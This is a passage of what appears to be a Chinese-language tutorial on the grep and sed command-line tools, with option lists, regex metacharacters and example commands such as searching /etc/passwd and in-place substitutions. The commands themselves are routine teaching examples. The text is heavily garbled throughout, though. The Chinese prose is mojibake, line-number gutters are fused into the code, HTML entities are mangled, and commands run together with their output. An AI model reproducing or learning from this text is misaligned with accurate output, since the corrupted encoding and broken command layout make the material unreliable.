å¿½ç•¥å­—ç¬¦å¤§å°å†™çš„å·®åˆ«ã€‚-l --file-with-matches # åˆ—å‡ºæ–‡ä»¶å†…å®¹ç¬¦åˆæŒ‡å®šçš„èŒƒæœ¬æ ·å¼çš„æ–‡ä»¶åç§°ã€‚-L --files-without-match # åˆ—å‡ºæ–‡ä»¶å†…å®¹ä¸ç¬¦åˆæŒ‡å®šçš„èŒƒæœ¬æ ·å¼çš„æ–‡ä»¶åç§°ã€‚-n --line-number # åœ¨æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ ·å¼çš„é‚£ä¸€åˆ—ä¹‹å‰ï¼Œæ ‡ç¤ºå‡ºè¯¥åˆ—çš„ç¼–å·ã€‚-q --quietæˆ–--silent # ä¸æ˜¾ç¤ºä»»ä½•ä¿¡æ¯ã€‚-R/-r --recursive # æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®šâ€œ-d recurseâ€å‚æ•°ç›¸åŒã€‚-s --no-messages # ä¸æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ã€‚-v --revert-match # åè½¬æŸ¥æ‰¾ã€‚-V --version # æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ -w --word-regexp # åªæ˜¾ç¤ºå…¨å­—ç¬¦åˆçš„åˆ—ã€‚-x --line-regexp # åªæ˜¾ç¤ºå…¨åˆ—ç¬¦åˆçš„åˆ—ã€‚-y # æ­¤å‚æ•°æ•ˆæœè·Ÿâ€œ-iâ€ç›¸åŒã€‚-o # åªè¾“å‡ºæ–‡ä»¶ä¸­åŒ¹é…åˆ°çš„éƒ¨åˆ†ã€‚ grepä¸­çš„æ­£åˆ™è¡¨è¾¾å¼12345678910111213141516171819202122232425&lt;sup&gt; # é”šå®šè¡Œçš„å¼€å§‹ å¦‚ï¼š'&lt;/sup&gt;grep'åŒ¹é…æ‰€æœ‰ä»¥grepå¼€å¤´çš„è¡Œã€‚ $ # é”šå®šè¡Œçš„ç»“æŸ å¦‚ï¼š'grep$'åŒ¹é…æ‰€æœ‰ä»¥grepç»“å°¾çš„è¡Œã€‚ . # åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„å­—ç¬¦ å¦‚ï¼š'gr.p'åŒ¹é…gråæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œç„¶åæ˜¯pã€‚ * # åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå…ˆå‰å­—ç¬¦ å¦‚ï¼š'*grep'åŒ¹é…æ‰€æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼åç´§è·Ÿgrepçš„è¡Œã€‚ .* # ä¸€èµ·ç”¨ä»£è¡¨ä»»æ„å­—ç¬¦ã€‚ [] # åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚'[Gg]rep'åŒ¹é…Grepå’Œgrepã€‚ [&lt;sup&gt;] # åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š'[&lt;/sup&gt;A-FH-Z]rep'åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿrepçš„è¡Œã€‚ \ # è½¬ä¹‰\(..\) # æ ‡è®°åŒ¹é…å­—ç¬¦ï¼Œå¦‚'\(love\)'ï¼Œloveè¢«æ ‡è®°ä¸º1ã€‚ \&lt; # é”šå®šå•è¯çš„å¼€å§‹ï¼Œå¦‚:'\&lt;grep'åŒ¹é…åŒ…å«ä»¥grepå¼€å¤´çš„å•è¯çš„è¡Œã€‚ \&gt; # é”šå®šå•è¯çš„ç»“æŸï¼Œå¦‚'grep\&gt;'åŒ¹é…åŒ…å«ä»¥grepç»“å°¾çš„å•è¯çš„è¡Œã€‚ x\&#123;m\&#125; # é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š'o\&#123;5\&#125;'åŒ¹é…åŒ…å«5ä¸ªoçš„è¡Œã€‚ x\&#123;m,\&#125; # é‡å¤å­—ç¬¦x,è‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š'o\&#123;5,\&#125;'åŒ¹é…è‡³å°‘æœ‰5ä¸ªoçš„è¡Œã€‚ x\&#123;m,n\&#125; # é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š'o\&#123;5,10\&#125;'åŒ¹é…5--10ä¸ªoçš„è¡Œã€‚ \w # åŒ¹é…æ–‡å­—å’Œæ•°å­—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯[A-Za-z0-9]ï¼Œå¦‚ï¼š'G\w*p'åŒ¹é…ä»¥Gåè·Ÿé›¶ä¸ªæˆ–å¤šä¸ªæ–‡å­—æˆ–æ•°å­—å­—ç¬¦ï¼Œç„¶åæ˜¯pã€‚ \W # \wçš„åç½®å½¢å¼ï¼ŒåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªéå•è¯å­—ç¬¦ï¼Œå¦‚ç‚¹å·å¥å·ç­‰ã€‚ \b # å•è¯é”å®šç¬¦ï¼Œå¦‚: '\bgrep\b'åªåŒ¹é…grepã€‚å¢å½•. # ä»»æ„ä¸€ä¸ªå­—ç¬¦a* # ä»»æ„å¤šä¸ªa(0ä¸ªæˆ–å¤šä¸ª)a? # 0ä¸ªæˆ–1ä¸ªaa+ # ä¸€ä¸ªæˆ–å¤šä¸ªa[A-Z][ABC] grepå‘½ä»¤å¸¸è§ç”¨æ³• åœ¨æ–‡ä»¶ä¸­æœç´¢ä¸€ä¸ªå•è¯ï¼Œå‘½ä»¤ä¼šè¿”å›ä¸€ä¸ªåŒ…å« â€œmatch_patternâ€ çš„æ–‡æœ¬è¡Œï¼š 12grep match_pattern file_namegrep "match_pattern" file_name åœ¨å¤šä¸ªæ–‡ä»¶ä¸­æŸ¥æ‰¾ 1grep "match_pattern" file_1 file_2 file_3 ... è¾“å‡ºé™¤ â€œmatch_patternâ€ ä¹‹å¤–çš„æ‰€æœ‰è¡Œ &gt;&gt; -v é€‰é¡¹ï¼š 1grep -v "match_pattern" file_name æ ‡è®°åŒ¹é…é¢œè‰² â€“color=auto é€‰é¡¹ï¼š 12345678910grep "match_pattern" file_name --color=autoeg: æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ä¸­çš„ `a`cts1 Desktop # grep "\(a\)" ./* --color=auto---./a:a./abc.txt:abcdefghijklmnopqrstuvwxyz./abc.txt:abcdefghijklmnopqrstuvwxyz./abc.txt:abcdefghijklmnopqrstuvwxyz... ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ -E é€‰é¡¹ï¼š123grep -E "[1-9]+"æˆ–egrep "[1-9]+" åªè¾“å‡ºæ–‡ä»¶ä¸­åŒ¹é…åˆ°çš„éƒ¨åˆ† -o é€‰é¡¹ï¼š 12345echo this is a test line. | grep -o -E "[a-z]+\."line.echo this is a test line. | egrep -o "[a-z]+\."line. ç»Ÿè®¡æ–‡ä»¶æˆ–è€…æ–‡æœ¬ä¸­åŒ…å«åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œæ•° -c é€‰é¡¹ï¼š 1grep -c "text" file_name è¾“å‡ºåŒ…å«åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œæ•° -n é€‰é¡¹ï¼š 123456grep "text" -n file_nameæˆ–cat file_name | grep "text" -n#å¤šä¸ªæ–‡ä»¶grep "text" -n file_1 file_2 æ‰“å°æ ·å¼åŒ¹é…æ‰€ä½äºçš„å­—ç¬¦æˆ–å­—èŠ‚åç§» 1234echo gun is not unix | grep -b -o "not"7:not#ä¸€è¡Œä¸­å­—ç¬¦ä¸²çš„å­—ç¬¦ä¾¿å®œæ˜¯ä»è¯¥è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹è®¡ç®—ï¼Œèµ·å§‹å€¼ä¸º0ã€‚é€‰é¡¹ **-b -o** ä¸€èˆ¬æ€»æ˜¯é…åˆä½¿ç”¨ã€‚ æœç´¢å¤šä¸ªæ–‡ä»¶å¹¶æŸ¥æ‰¾åŒ¹é…æ–‡æœ¬åœ¨å“ªäº›æ–‡ä»¶ä¸­ 1grep -l "text" file1 file2 file3... grepé€’å½’æœç´¢æ–‡ä»¶123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# åœ¨å¤šçº§ç›®å½•ä¸­å¯¹æ–‡æœ¬è¿›è¡Œé€’å½’æœç´¢grep "text" . -r -n# .è¡¨ç¤ºå½“å‰ç›®å½•ã€‚# å¿½ç•¥åŒ¹é…æ ·å¼ä¸­çš„å­—ç¬¦å¤§å°å†™echo "hello world" | grep -i "HELLO"hello# é€‰é¡¹ -e åˆ¶åŠ¨å¤šä¸ªåŒ¹é…æ ·å¼ï¼šecho this is a text line | grep -e "is" -e "line" -oisline#ä¹Ÿå¯ä»¥ä½¿ç”¨ **-f** é€‰é¡¹æ¥åŒ¹é…å¤šä¸ªæ ·å¼ï¼Œåœ¨æ ·å¼æ–‡ä»¶ä¸­é€è¡Œå†™å‡ºéœ€è¦åŒ¹é…çš„å­—ç¬¦ã€‚cat patfileaaabbb# ç”¨æ–‡ä»¶åç§°åŒ¹é…, å®é™…ä¸Šå°±æ˜¯åŒ¹é…æ–‡ä»¶ä¸­çš„å†…å®¹echo aaa bbb ccc ddd eee | grep -f patfile -oaaabbb# åœ¨grepæœç´¢ç»“æœä¸­åŒ…æ‹¬æˆ–è€…æ’é™¤æŒ‡å®šæ–‡ä»¶ï¼š---#åªåœ¨ç›®å½•ä¸­æ‰€æœ‰çš„.phpå’Œ.htmlæ–‡ä»¶ä¸­é€’å½’æœç´¢å­—ç¬¦"main()"grep "main()" . -r --include *.&#123;php,html&#125;#åœ¨æœç´¢ç»“æœä¸­æ’é™¤æ‰€æœ‰READMEæ–‡ä»¶grep "main()" . -r --exclude "README"#åœ¨æœç´¢ç»“æœä¸­æ’é™¤filelistæ–‡ä»¶åˆ—è¡¨é‡Œçš„æ–‡ä»¶grep "main()" . -r --exclude-from filelist---# ä½¿ç”¨0å€¼å­—èŠ‚åç¼€çš„grepä¸xargsï¼š---# æµ‹è¯•æ–‡ä»¶ï¼šecho "aaa" &gt; file1echo "bbb" &gt; file2echo "aaa" &gt; file3grep "aaa" file* -lZ | xargs -0 rm#æ‰§è¡Œåä¼šåˆ é™¤file1å’Œfile3ï¼Œgrepè¾“å‡ºç”¨-Zé€‰é¡¹æ¥æŒ‡å®šä»¥0å€¼å­—èŠ‚ä½œä¸ºç»ˆç»“ç¬¦æ–‡ä»¶åï¼ˆ\0ï¼‰ï¼Œxargs -0 è¯»å–è¾“å…¥å¹¶ç”¨0å€¼å­—èŠ‚ç»ˆç»“ç¬¦åˆ†éš”æ–‡ä»¶åï¼Œç„¶ååˆ é™¤åŒ¹é…æ–‡ä»¶ï¼Œ-Zé€šå¸¸å’Œ-lç»“åˆä½¿ç”¨ã€‚# å¥½å§, æš‚æ—¶æˆ‘ä¹Ÿæ²¡æ‡‚æ˜¯å•¥æ„æ€...---# grepé™é»˜è¾“å‡ºï¼šgrep -q "test" filename# ä¸ä¼šè¾“å‡ºä»»ä½•ä¿¡æ¯ï¼Œå¦‚æœå‘½ä»¤è¿è¡ŒæˆåŠŸè¿”å›0ï¼Œå¤±è´¥åˆ™è¿”å›é0å€¼ã€‚ä¸€èˆ¬ç”¨äºæ¡ä»¶æµ‹è¯•ã€‚# æ‰“å°å‡ºåŒ¹é…æ–‡æœ¬ä¹‹å‰æˆ–è€…ä¹‹åçš„è¡Œï¼š# æ˜¾ç¤ºåŒ¹é…æŸä¸ªç»“æœä¹‹åçš„3è¡Œï¼Œä½¿ç”¨ -A é€‰é¡¹ï¼šseq 10 | grep "5" -A 35678# æ˜¾ç¤ºåŒ¹é…æŸä¸ªç»“æœä¹‹å‰çš„3è¡Œï¼Œä½¿ç”¨ -B é€‰é¡¹ï¼šseq 10 | grep "5" -B 32345# æ˜¾ç¤ºåŒ¹é…æŸä¸ªç»“æœçš„å‰ä¸‰è¡Œå’Œåä¸‰è¡Œï¼Œä½¿ç”¨ -C é€‰é¡¹ï¼šseq 10 | grep "5" -C 32345678# å¦‚æœåŒ¹é…ç»“æœæœ‰å¤šä¸ªï¼Œä¼šç”¨â€œ--â€ä½œä¸ºå„åŒ¹é…ç»“æœä¹‹é—´çš„åˆ†éš”ç¬¦ï¼šecho -e "a\nb\nc\na\nb\nc" | grep a -A 1ab--ab grepå…¶å®ƒå¸¸ç”¨ç”¨æ³•12345678910111213141516171819202122232425262728293031323334353637383940414243444546# ç»Ÿè®¡å‡ºç°æŸä¸ªå­—ç¬¦ä¸²çš„è¡Œçš„æ€»è¡Œæ•° '-c'cts1 Desktop # echo "hello" &gt;&gt; hello.shcts1 Desktop # grep -c 'hello' hello.sh1# æŸ¥è¯¢ä¸åŒ…å«helloçš„è¡Œ, å¸¦æœ‰helloçš„æ•´è¡Œéƒ½ä¸ä¼šè¢«æŸ¥è¯¢åˆ° '-v'cts1 Desktop # grep -v 'hello' hello.sh....# `.*`çš„ç”¨æ³•, å‰åéƒ½æ˜¯ `.*` , åªè¦åŒ…å« parrten çš„ æ•´è¡Œ éƒ½ä¼šè¢«æŸ¥å‡ºæ¥grep '.*hello.*' hello.sh# ä»»ä½•ç”± 'h..p'åŒ…å«çš„éƒ½ä¼šè¢«æŸ¥å‡ºæ¥. æŸ¥çš„å½“å‰è¡Œ, .* ä»£è¡¨ä»»æ„å­—ç¬¦cts1 Desktop # grep 'h.*p' /etc/passwdgopher:x:13:30:gopher:/var/gopher:/sbin/nologinrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nolo# æ­£åˆ™è¡¨è¾¾ä»¥ ro å¼€å¤´cts1 Desktop # grep '^ro' /etc/passwdroot:x:0:0:root:/root:/bin/zsh# æ­£åˆ™è¡¨è¾¾ä»¥ t ç»“å°¾cts1 Desktop # grep 't$' /etc/passwdhalt:x:7:0:halt:/sbin:/sbin/halt# '[Gg]rep'åŒ¹é…Grepå’Œgrep## æ­¤å¤„æ˜¯åŒ¹é… ä»¥ h || r å¼€å¤´çš„cts1 Desktop # grep '^[hr]' /etc/passwdroot:x:0:0:root:/root:/bin/zshhalt:x:7:0:halt:/sbin:/sbin/haltrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin# åŒ¹é…éhä¹‹å¤–å…¶ä»–çš„, å’Œ r å¼€å¤´çš„, ä¹Ÿå°±æ˜¯åŒ¹é… hä»¥å¤–çš„cts1 Desktop # grep '^[hr]' /etc/passwdroot:x:0:0:root:/root:/bin/zshhalt:x:7:0:halt:/sbin:/sbin/haltrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin# åŒ¹é… h-r ä»¥å¤–çš„cts1 Desktop # grep '&lt;sup&gt;[&lt;/sup&gt;h-r]' /etc/passwdbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologin... sed(æµç¼–è¾‘å™¨)sedå«åšæµç¼–è¾‘å™¨ï¼Œåœ¨shellè„šæœ¬å’ŒMakefileä¸­ä½œä¸ºè¿‡æ»¤ä¸€ä½¿ç”¨éå¸¸æ™®éï¼Œä¹Ÿå°±æ˜¯æŠŠå‰ä¸€ä¸ªç¨‹åºçš„è¾“å‡ºå¼•å…¥sedçš„è¾“å…¥ï¼Œç»è¿‡ä¸€ç³»åˆ—ç¼–è¾‘å‘½ä»¤è½¬æ¢æˆä¸ºå¦ä¸€ç§æ ¼å¼è¾“å‡ºã€‚sedæ˜¯ä¸€ç§åœ¨çº¿ç¼–è¾‘å™¨ï¼Œå®ƒä¸€æ¬¡å¤„ç†ä¸€è¡Œå†…å®¹ï¼Œå¤„ç†æ—¶ï¼ŒæŠŠå½“å‰å¤„ç†çš„è¡Œå­˜å‚¨åœ¨ä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œç§°ä¸ºâ€æ¨¡å¼ç©ºé—´â€,æ¥ç€ç”¨sedå‘½ä»¤å¤„ç†ç¼“å†²åŒºä¸­çš„å†…å®¹ï¼Œå¤„ç†å®Œæˆåï¼ŒæŠŠç¼“å†²åŒºçš„å†…å®¹é€å¾€å±å¹•ã€‚æ¥ç€å¤„ç†ä¸‹ä¸€è¡Œï¼Œè¿™æ ·ä¸æ–­é‡å¤ï¼Œç›´åˆ°æ–‡ä»¶æœ«å°¾ã€‚æ–‡ä»¶å†…å®¹å¹¶æ²¡æœ‰æ”¹å˜ï¼Œé™¤éä½ ä½¿ç”¨é‡å®šå‘å­˜å‚¨è¾“å‡ºã€‚ é€‰é¡¹12345678910111213-nï¼šä¸€èˆ¬sedå‘½ä»¤ä¼šæŠŠæ‰€æœ‰æ•°æ®éƒ½è¾“å‡ºåˆ°å±å¹•ï¼Œå¦‚æœåŠ å…¥-né€‰é¡¹çš„è¯ï¼Œåˆ™åªä¼šæŠŠç»è¿‡sedå‘½ä»¤å¤„ç†çš„è¡Œè¾“å‡ºåˆ°å±å¹•ã€‚-e&lt;script&gt;æˆ–--expression=&lt;script&gt;ï¼šä»¥é€‰é¡¹ä¸­çš„æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ï¼› å…è®¸å¯¹è¾“å…¥æ•°æ®åº”ç”¨å¤šæ¡sedå‘½ä»¤ç¼–è¾‘ã€‚-iï¼šç”¨sedçš„ä¿®æ”¹ç»“æœç›´æ¥ä¿®æ”¹è¯»å–æ•°æ®çš„æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç”±å±å¹•è¾“å‡ºã€‚-f&lt;scriptæ–‡ä»¶&gt;æˆ–--file=&lt;scriptæ–‡ä»¶&gt;ï¼šä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ–‡ä»¶æ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ï¼›-næˆ–--quietæˆ–â€”â€”silentï¼šä»…æ˜¾ç¤ºscriptå¤„ç†åçš„ç»“æœï¼›--versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚# åŠ¨ä½œ:aï¼šè¿½åŠ ï¼Œåœ¨å½“å‰è¡Œåæ·»åŠ ä¸€è¡Œæˆ–å¤šè¡Œã€‚cï¼šè¡Œæ›¿æ¢ï¼Œç”¨cåé¢çš„å­—ç¬¦ä¸²æ›¿æ¢åŸæ•°æ®è¡Œã€‚iï¼šæ’å…¥ï¼Œåœ¨å½“å‰è¡Œå‰æ’å…¥ä¸€è¡Œæˆ–å¤šè¡Œã€‚pï¼šæ‰“å°ï¼Œè¾“å‡ºæŒ‡å®šçš„è¡Œã€‚sï¼šå­—ç¬¦ä¸²æ›¿æ¢ï¼Œç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢å¦å¤–ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ ¼å¼ä¸º**\'**è¡ŒèŒƒå›´s/æ—§å­—ç¬¦ä¸²/æ–°å­—ç¬¦ä¸²/g**\'** (å¦‚æœä¸åŠ gçš„è¯ï¼Œåˆ™è¡¨ç¤ºåªæ›¿æ¢æ¯è¡Œç¬¬ä¸€ä¸ªåŒ¹é…çš„ä¸²) sedå…ƒå­—ç¬¦é›†(æ­£åˆ™)12345678910111213**&lt;sup&gt;** åŒ¹é…è¡Œå¼€å§‹ï¼Œå¦‚ï¼š/&lt;/sup&gt;sed/åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œã€‚**$** åŒ¹é…è¡Œç»“æŸï¼Œå¦‚ï¼š/sed$/åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œã€‚**.** åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ï¼Œå¦‚ï¼š/s.d/åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œæœ€åæ˜¯dã€‚**** * åŒ¹é…0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œå¦‚ï¼š/*sed/åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼åç´§è·Ÿsedçš„è¡Œã€‚**[]** åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚/[ss]ed/åŒ¹é…sedå’ŒSedã€‚ **[&lt;sup&gt;]** åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š/[&lt;/sup&gt;A-RT-Z]ed/åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œã€‚**\(..\)** åŒ¹é…å­ä¸²ï¼Œä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s/\(love\)able/\1rsï¼Œloveableè¢«æ›¿æ¢æˆloversã€‚**&amp;** ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚s/love/ **&amp;** /ï¼Œloveè¿™æˆ **love** ã€‚**\&lt;** åŒ¹é…å•è¯çš„å¼€å§‹ï¼Œå¦‚:/\&lt;love/åŒ¹é…åŒ…å«ä»¥loveå¼€å¤´çš„å•è¯çš„è¡Œã€‚**\&gt;** åŒ¹é…å•è¯çš„ç»“æŸï¼Œå¦‚/love\&gt;/åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œã€‚**x\&#123;m\&#125;** é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š/0\&#123;5\&#125;/åŒ¹é…åŒ…å«5ä¸ª0çš„è¡Œã€‚**x\&#123;m,\&#125;** é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š/0\&#123;5,\&#125;/åŒ¹é…è‡³å°‘æœ‰5ä¸ª0çš„è¡Œã€‚**x\&#123;m,n\&#125;** é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š/0\&#123;5,10\&#125;/åŒ¹é…5~10ä¸ª0çš„è¡Œã€‚ å®ä¾‹ åˆ é™¤: då‘½ä»¤ sed â€˜2dâ€™ sed.txt â€”â€“åˆ é™¤sed.txtæ–‡ä»¶çš„ç¬¬äºŒè¡Œã€‚ sed â€˜2,$dâ€™ sed.txt â€”â€“åˆ é™¤sed.txtæ–‡ä»¶çš„ç¬¬äºŒè¡Œåˆ°æœ«å°¾æ‰€æœ‰è¡Œã€‚ sed â€˜$dâ€™ sed.txt â€”â€“åˆ é™¤sed.txtæ–‡ä»¶çš„æœ€åä¸€è¡Œã€‚ sed â€˜/test/d â€˜ sed.txt â€”â€“åˆ é™¤sed.txtæ–‡ä»¶æ‰€æœ‰åŒ…å«testçš„è¡Œã€‚ sed â€˜/[A-Za-z]/d â€˜ sed.txt â€”â€“åˆ é™¤sed.txtæ–‡ä»¶æ‰€æœ‰åŒ…å«å­—æ¯çš„è¡Œã€‚ æ•´è¡Œæ›¿æ¢: cå‘½ä»¤ å°†ç¬¬äºŒè¡Œæ›¿æ¢æˆhello world sed \â€™2c hello world\â€™ sed.txt å­—ç¬¦ä¸²æ›¿æ¢ï¼šså‘½ä»¤ sed â€˜s/hello/hi/gâ€™ sed.txt ## åœ¨æ•´è¡ŒèŒƒå›´å†…æŠŠhelloæ›¿æ¢ä¸ºhiã€‚å¦‚æœæ²¡æœ‰gæ ‡è®°ï¼Œåˆ™åªæœ‰æ¯è¡Œç¬¬ä¸€ä¸ªåŒ¹é…çš„helloè¢«æ›¿æ¢æˆhiã€‚ sed â€˜s/hello/hi/2â€™ sed.txt ## æ­¤ç§å†™æ³•è¡¨ç¤ºåªæ›¿æ¢æ¯è¡Œçš„ç¬¬2ä¸ªhelloä¸ºhi sed â€˜s/hello/hi/2gâ€™ sed.txt ## æ­¤ç§å†™æ³•è¡¨ç¤ºåªæ›¿æ¢æ¯è¡Œçš„ç¬¬2ä¸ªä»¥åçš„helloä¸ºhiï¼ˆåŒ…æ‹¬ç¬¬2ä¸ªï¼‰ sed -n â€˜s/^hello/hi/pâ€™ sed.txt ## (-n)é€‰é¡¹å’Œpæ ‡å¿—ä¸€èµ·ä½¿ç”¨è¡¨ç¤ºåªæ‰“å°é‚£äº›å‘ç”Ÿæ›¿æ¢çš„è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸä¸€è¡Œå¼€å¤´çš„helloè¢«æ›¿æ¢æˆhiï¼Œå°±æ‰“å°å®ƒã€‚ sed -n â€˜2,4pâ€™ sed.txt ## æ‰“å°è¾“å‡ºsed.txtä¸­çš„ç¬¬2è¡Œå’Œç¬¬4è¡Œ sed -n â€˜s/hello/&amp;-hi/gpâ€™ sed.txt sed â€˜s/^192.168.0.1/&amp;-localhost/â€˜ sed.txt sed â€˜s/^192.168.0.1/[&amp;]/â€˜ sed.txt ## &amp;ç¬¦å·è¡¨ç¤ºè¿½åŠ ä¸€ä¸ªä¸²åˆ°æ‰¾åˆ°çš„ä¸²å, &amp;ä»£è¡¨å‰ä¸€ä¸ªä¸²ã€‚ æ‰€æœ‰ä»¥192.168.0.1å¼€å¤´çš„è¡Œéƒ½ä¼šè¢«æ›¿æ¢æˆå®ƒè‡ªå·²åŠ  -localhostï¼Œå˜æˆ192.168.0.1-localhostã€‚ ç¬¬ä¸‰å¥è¡¨ç¤ºç»™IPåœ°å€æ·»åŠ ä¸­æ‹¬å· sed -n â€˜s/(liu)jialing/\1tao/pâ€™ sed.txt sed -n â€˜s/(liu)jia(ling)/\1tao\2ss/pâ€™ sed.txt ## liuè¢«æ ‡è®°ä¸º\1ï¼Œæ‰€ä»¥liuä¼šè¢«ä¿ç•™ä¸‹æ¥ï¼ˆ\1 == liuï¼‰ ## lingè¢«æ ‡è®°ä¸º\2ï¼Œæ‰€ä»¥lingä¹Ÿä¼šè¢«ä¿ç•™ä¸‹æ¥ï¼ˆ\2 == lingï¼‰ ## æ‰€ä»¥æœ€åçš„ç»“æœå°±æ˜¯\1tao\2ss == â€œliuâ€ + â€œtaoâ€ + â€œlingâ€ + â€œssâ€ æ­¤å¤„åˆ‡è®°ï¼š\1ä»£è¡¨çš„æ˜¯è¢«ç¬¬ä¸€ä¸ª()åŒ…å«çš„å†…å®¹ï¼Œ\1ä»£è¡¨çš„æ˜¯è¢«ç¬¬ä¸€ä¸ª()åŒ…å«çš„å†…å®¹ï¼Œâ€¦â€¦ ä¸Šé¢å‘½ä»¤çš„æ„æ€å°±æ˜¯ï¼šè¢«æ‹¬å·åŒ…å«çš„å­—ç¬¦ä¸²ä¼šä¿ç•™ä¸‹æ¥ï¼Œç„¶åè·Ÿå…¶ä»–çš„å­—ç¬¦ä¸²æ¯”å¦‚taoå’Œssç»„æˆæ–°çš„å­—ç¬¦ä¸²liutaolingss sed â€˜s#hello#hi#gâ€™ sed.txt ## ä¸è®ºä»€ä¹ˆå­—ç¬¦ï¼Œç´§è·Ÿç€så‘½ä»¤çš„éƒ½è¢«è®¤ä¸ºæ˜¯æ–°çš„åˆ†éš”ç¬¦ï¼Œæ‰€ä»¥ï¼Œâ€#â€åœ¨è¿™é‡Œæ˜¯åˆ†éš”ç¬¦ï¼Œä»£æ›¿äº†é»˜è®¤çš„â€/â€œåˆ†éš”ç¬¦ã€‚è¡¨ç¤ºæŠŠæ‰€æœ‰helloæ›¿æ¢æˆhiã€‚ é€‰å®šè¡Œçš„èŒƒå›´ï¼šé€—å· sed -n â€˜/today/,/hello/pâ€™ sed.txt ## æ‰€æœ‰åœ¨æ¨¡æ¿todayå’Œhelloæ‰€ç¡®å®šçš„èŒƒå›´å†…çš„è¡Œéƒ½è¢«æ‰“å°ã€‚éƒ½æ‰¾ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä»ç¬¬ä¸€ä¸ªtodayåˆ°ç¬¬ä¸€ä¸ªhello sed -n â€˜5,/^hello/pâ€™ sed.txt sed -n â€˜/^hello/,8pâ€™ sed.txt ## æ‰“å°ä»ç¬¬äº”è¡Œå¼€å§‹åˆ°ç¬¬ä¸€ä¸ªåŒ…å«ä»¥helloå¼€å§‹çš„è¡Œä¹‹é—´çš„æ‰€æœ‰è¡Œã€‚ sed â€˜/today/,/hello/s/$/www/â€˜ sed.txt ## å¯¹äºæ¨¡æ¿todayå’Œhelloä¹‹é—´çš„è¡Œï¼Œæ¯è¡Œçš„æœ«å°¾ç”¨å­—ç¬¦ä¸²wwwæ›¿æ¢ã€‚ sed â€˜/today/,/hello/s/^/www/â€˜ sed.txt ## å¯¹äºæ¨¡æ¿todayå’Œhelloä¹‹é—´çš„è¡Œï¼Œæ¯è¡Œçš„å¼€å¤´ç”¨å­—ç¬¦ä¸²wwwæ›¿æ¢ã€‚ sed â€˜/^[A-Za-z]/s/5/five/gâ€™ sed.txt ## å°†ä»¥å­—æ¯å¼€å¤´çš„è¡Œä¸­çš„æ•°å­—5æ›¿æ¢æˆfive å¤šç‚¹ç¼–è¾‘ï¼šeå‘½ä»¤ sed -e â€˜1,5dâ€™ -e â€˜s/hello/hi/â€˜ 